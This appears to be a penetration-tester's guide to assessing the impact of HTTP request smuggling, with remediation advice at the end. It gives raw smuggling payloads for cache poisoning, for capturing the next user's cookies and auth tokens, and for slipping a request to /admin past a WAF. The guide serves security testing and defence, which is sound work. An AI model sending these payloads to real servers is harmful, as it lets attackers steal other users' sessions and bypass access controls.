# Impact Assessment — After Confirming Request Smuggling

## Summary
Once a smuggling variant has been confirmed, the next step is to assess the real-world impact through cache poisoning, request hijacking, and WAF bypass.

## Web Cache Poisoning

### Attack
Smuggle a response that poisons the cache for a popular URL.

```http
POST / HTTP/1.1
Host: target.com
Content-Length: [calculated]
Transfer-Encoding: chunked

0

GET /popular HTTP/1.1
Host: target.com
Foo: bar
```

If the smuggled request's response gets cached as the response to the original request, anyone visiting the target URL receives the poisoned response.

### Detection
1. Confirm that the origin server does not set Cache-Control: no-store
2. Smuggle a request to an uncached path and check if its response appears in the cache for a different URL
3. Use a unique cache buster (random query parameter) to verify cache key association

## Request Hijacking

### Attack
Smuggle a prefix that captures the next user's request:

```http
POST / HTTP/1.1
Host: target.com
Content-Length: [calculated]
Transfer-Encoding: chunked

0

GET / HTTP/1.1
Host: target.com
X-Ignore: X
```

Bytes following "X-Ignore: X" are interpreted as the start of the next request.

### Capturing Victim Data
If the smuggled prefix uses POST and leaves the body open, the next user's request body is appended to the smuggled request:

```http
POST /capture HTTP/1.1
Host: target.com
Content-Length: 10000
Transfer-Encoding: chunked

0

POST /log HTTP/1.1
Host: target.com
Content-Length: 10000

```

The next user's request (including cookies, auth tokens, POST data) is appended to this POST body and sent to /log.

## WAF / ACL Bypass

### Attack
Smuggle a forbidden path behind the safety of a permitted prefix:

```http
POST /allowed-path HTTP/1.1
Host: target.com
Content-Length: [calculated]
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: target.com
```

The WAF sees a POST to /allowed-path (permitted) while the back-end processes GET /admin.

## Remediation
- Fix the root parser discrepancy at the proxy layer
- Use HTTP/2 end-to-end to eliminate HTTP/1.1 framing attacks
- Disable HTTP/1.0 upgrade path and connection coalescing
- Apply strict header normalisation at all reverse proxy layers
